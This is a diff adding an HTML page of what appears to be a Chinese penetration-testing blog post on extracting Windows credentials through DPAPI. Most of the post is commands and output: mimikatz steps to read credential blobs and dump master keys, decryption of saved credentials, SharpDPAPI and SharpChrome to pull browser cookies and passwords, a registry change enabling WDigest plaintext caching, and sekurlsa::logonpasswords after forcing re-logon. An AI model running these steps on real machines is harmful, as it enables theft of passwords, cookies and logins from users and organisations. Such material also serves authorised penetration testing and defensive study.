@@ -1,0 +1,419 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>通过DPAPI获取windows身份凭证 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="背景介绍DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:
+
+IE、Chrome密码登陆表单的自动完成
+邮箱客户端用户密码
+FTP管理账户密码
+远程桌面身份密码
+……
+
+查找本地的Credentials:通常的保存位置:
+
+%appdata%\Microsoft\Credentials
+%localappdata%\Microsoft\Credentials
+%userprofile%\AppData\Local\Microsoft\Credentials\*
+
+因为文件被隐藏，命令行下需要查看需要加上/a可以看到:
+dir &amp;#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*
+
+获取GUID# 打印结构体信息
+mimikatz dpapi::cred &amp;#x2F;in:&amp;quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&amp;quot;
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : &amp;#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&amp;#125;
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : &amp;#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&amp;#125;
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000012 - 18
+  szDescription      : 本地凭据数据
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
+  dwDataLen          : 00002a70 - 10864
+  pbData             : xxxxxxz
+  dwSignLen          : 00000040 - 64
+  pbSign             : xxxxx"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="通过DPAPI获取windows身份凭证"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 通过DPAPI获取windows身份凭证</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
+<ul>
+<li>IE、Chrome密码登陆表单的自动完成</li>
+<li>邮箱客户端用户密码</li>
+<li>FTP管理账户密码</li>
+<li>远程桌面身份密码</li>
+<li>……</li>
+</ul>
+<p>查找本地的Credentials:<br>通常的保存位置:</p>
+<ul>
+<li><code>%appdata%\Microsoft\Credentials</code></li>
+<li><code>%localappdata%\Microsoft\Credentials</code></li>
+<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
+</ul>
+<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
+<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
+mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000012 - 18
+  szDescription      : 本地凭据数据
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
+  dwDataLen          : 00002a70 - 10864
+  pbData             : xxxxxxz
+  dwSignLen          : 00000040 - 64
+  pbSign             : xxxxx
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>guidMasterKey指向MasterKey的索引,是凭据的GUID，</p>
+<h3 id="获取MasterKey"><a href="#获取MasterKey" class="headerlink" title="获取MasterKey"></a>获取MasterKey</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::dpapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 374001 (00000000:0005b4f1)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : PC-201908211659
+Logon Server      : PC-201908211659
+Logon Time        : 2020&#x2F;3&#x2F;22 14:23:45
+SID               : S-1-5-21-4128703178-143578513-755070304-500
+	 [00000000]
+	 * GUID      :	&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
+	 * Time      :	2020&#x2F;4&#x2F;13 10:45:31
+	 * MasterKey :	1d30e724aab2b4ee5c83707c5xxx
+	 * sha1(key) :	xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据<code>GUID:&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;</code>找到关联的Masterkey, 这个MasterKey就是加密的密钥</p>
+<p>###解密<br>根据找到的Credentials和MaterKey,使用mimikatz解密:</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz dpapi::cred &#x2F;in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\&lt;Credentials&gt; &#x2F;masterkey:&lt;MasterKey&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h4 id="sharpDPAPI"><a href="#sharpDPAPI" class="headerlink" title="sharpDPAPI"></a>sharpDPAPI</h4><p>自动化利用工具，一键dump，在CNA脚本中修改<code>$SharpDPAPI::AssemblyPath</code>为本机器上面sharpDPAPI.exe的绝对路径，不用上传到目标机器上面，然后:</p>
+<pre class="line-numbers language-none"><code class="language-none"># dump出来masterKey
+sekurlsa::dpapi
+
+# 查看已经缓存的key
+dpapi::cache
+
+# 一键dump
+shareDPAPI -dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>另外可以使用<code>SharepChrome</code>来导出Chrome的密码和历史记录，可以配合<code>SharepWeb</code>导出firefox、EDGE浏览器的信息等</p>
+<pre class="line-numbers language-none"><code class="language-none">SharpChrome.exe cookies &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; &#x2F;unprotect
+
+SharpChrome.exe logins &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="高版本限制"><a href="#高版本限制" class="headerlink" title="高版本限制"></a>高版本限制</h4><p>在win10和2012R2以上的时候，默认内存缓存中禁止保存明文密码,需要开启wdigest Auth:</p>
+<ul>
+<li>cmd</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>powershell</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>关闭命令:</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>开启之后，需要管理员重新登陆才可以抓明文密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">rundll32 user32.dll,LockWorkStation
+
+mimikatz:
+sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials</a></li>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb">https://github.com/djhohnstein/SharpWeb</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a></li>
+<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/04/13/dpapi-pass-dump.html" class="leancloud-visitors view" data-flag-title="通过DPAPI获取windows身份凭证">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2020/04/22/how-to-hack-bank.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2019/12/13/python-debug.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-04-13 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">背景介绍</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96GUID"><span class="toc-article-text">获取GUID</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96MasterKey"><span class="toc-article-text">获取MasterKey</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#sharpDPAPI"><span class="toc-article-text">sharpDPAPI</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="toc-article-text">高版本限制</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
